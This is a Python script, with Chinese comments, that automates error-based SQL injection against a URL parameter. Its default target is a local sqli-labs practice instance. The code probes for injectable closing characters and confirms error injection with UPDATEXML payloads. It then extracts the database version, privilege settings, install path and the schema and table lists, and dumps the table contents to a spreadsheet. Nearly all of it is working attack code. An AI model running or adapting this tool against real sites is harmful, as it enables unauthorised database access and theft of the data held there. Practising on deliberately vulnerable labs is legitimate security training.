# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201118 -*-

import userdata
from inj_exp_error import *
from savedata_xlsx import SaveXlsx

# # 初始化全局函数
# GetResult_ERROR = inj_exp.GetResult_ERROR
# SelectTables = inj_exp.SelectTables

# 初始化全局参数
Global_UserData = userdata.Global_UserData
Global_Headers = {'User-Agent': Global_UserData['User-Agent']}

class UrlInjector(object):
    _url_info = None

    def __init__(self, Url):
        """初始化注入类的信息"""
        content = requests.get(url=Url % 1, headers=Global_Headers)
        print(f'>初始化网址 {Url % 1} {content.status_code}', end=' ')
        if content.status_code != 200:
            print("初始化失败！！ERROR")
            return
        self.url = Url
        self.body_len = int(content.headers['Content-Length']) \
            if 'Content-Length' in content.headers \
            else int(len(content.content))
        print(f'初始化Len {self.body_len}')
        self._type = Global_UserData['inj_type']
        self._url_info = {}
        pass

    def PublicCheck(self):
        # 如果初始化网页失败，则返回
        if self._url_info is None:
            return False

        # 构造是否有注入点的返回值
        bool_is_have = False

        # 循环测试闭合点
        for url_end in self._type:
            url = self.url % url_end + ' and 0 --+错误注入'
            print("【" + url, end="】")

            # 测试链接，并得到返回长度
            content = requests.get(url=url, headers=Global_Headers)
            body_len = int(content.headers['Content-Length']) \
                if 'Content-Length' in content.headers \
                else int(len(content.content))
            print("\t【这是网页原文", content.status_code, body_len)

            # 判断网页是否和初始化时的长度一样
            # 不一致则表示注入成功了
            if body_len != self.body_len:
                print(content.text.replace('\r\n', ''),
                      end="\t】原文结束\n\n")
                if "类型注入" not in self._url_info:
                    self._url_info["类型注入"] = self.url % url_end
                    bool_is_have = True
                    pass
                url = self.url % url_end + ' and UPDATEXML(0,concat(char(126)),0)--+'
                content = requests.get(url=url, headers=Global_Headers)
                if "XPATH syntax error" in content.text and \
                        "错误注入" not in self._url_info:
                    self._url_info['错误注入'] = self.url % url_end
                    bool_is_have = True
                    break
            pass
        pass
        return bool_is_have

    def Print(self):
        """
        函数 : 打印网页注入信息

        :return: 返回是否有网页注入
        """

        # 打印头
        print(f">开始输出注入类型：{len(self._url_info)}")
        ret_payload = {}
        if "错误注入" in self._url_info:
            ret_payload["错误注入"] = self._url_info['错误注入']
            pass

        # 循环输出存在的注入类型
        for info in self._url_info:
            print(f'>>存在注入\t{info}\t【{self._url_info[info]}】')

            # 构造返回的结果
            if len(ret_payload) == 0:
                ret_payload[info] = self._url_info[info]
        print('^^' + '-' * len(str(ret_payload)) + '\n')

        # 返回注入信息，供漏洞利用
        if len(ret_payload) == 0:
            return None
        return ret_payload
        pass

    # noinspection PyMethodMayBeStatic
    def PublicExp(self, payload: dict):
        """
        :param payload:用于注入点的字典
        :return: 返回T/F,表示是否成功利用
        """

        if len(payload) == 0:
            return False
        mode = url0 = None
        for x in payload:
            mode, url0 = x, payload[x]
        print(f'>开始漏洞利用\t{mode}【{url0}】')
        if mode == '错误注入':
            # 构造注入语句
            url = url0

            # 构造脱裤信息
            if '脱裤_数据库信息' not in self._url_info:
                self._url_info['脱裤_数据库信息'] = {}
            dict_sql = self._url_info['脱裤_数据库信息']
            dict_sql['数据库版本'] = GetResult_ERROR(url, '@@VERSION')
            dict_sql['数据库文件权限'] = GetResult_ERROR(url, '@@secure_file_priv')
            dict_sql['数据库安装路径'] = GetResult_ERROR(url, '@@basedir')
            dict_sql['本数据库名'] = GetResult_ERROR(url, 'database()')
            # tmp_db_name = None if dict_sql['本数据库名'] is None \
            #     else dict_sql['本数据库名']

            dict_sql['系统数据库总数'] = GetResult_ERROR(
                url, 'SELECT COUNT(*) FROM information_schema.schemata')
            dict_sql['系统数据库索引'] = GetResult_ERROR(
                url, 'SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata')

            dict_sql['系统表格总数'] = GetResult_ERROR(
                url, 'SELECT COUNT(*) FROM information_schema.TABLES')
            dict_sql['本表格总数'] = GetResult_ERROR(
                url, 'SELECT count(*) FROM information_schema.STATISTICS '
                     'WHERE TABLE_SCHEMA=database()')
            dict_sql['本表格索引'] = GetResult_ERROR(
                url, 'SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.STATISTICS '
                     'WHERE TABLE_SCHEMA=database()')

            if '脱裤_数据库信息' in self._url_info and \
                    '本表格索引' in dict_sql:
                print(f">需要脱裤\t{dict_sql['本表格索引']}")
                self._url_info['脱裤_数据库数据'] = {}
                SelectTables(
                    url0,
                    dict_sql['本数据库名'],
                    dict_sql['本表格索引'],
                    self._url_info['脱裤_数据库数据']
                )

            pp.pprint(self._url_info)
            return True
        pass

    def PublicSaveXlsx(self):
        SaveXlsx()
        pass

    pass


def main():
    g_url = 'http://127.0.0.1:8001/sqli/Less-{}/?id=%s'
    inj = UrlInjector(g_url.format(1, '{}'))
    if inj.PublicCheck():
        if payload := inj.Print():
            if inj.PublicExp(payload):
                # 利用成功，保存xlsx
                inj.PublicSaveXlsx()
                pass

    pass


if __name__ == '__main__':
    main()
    pass
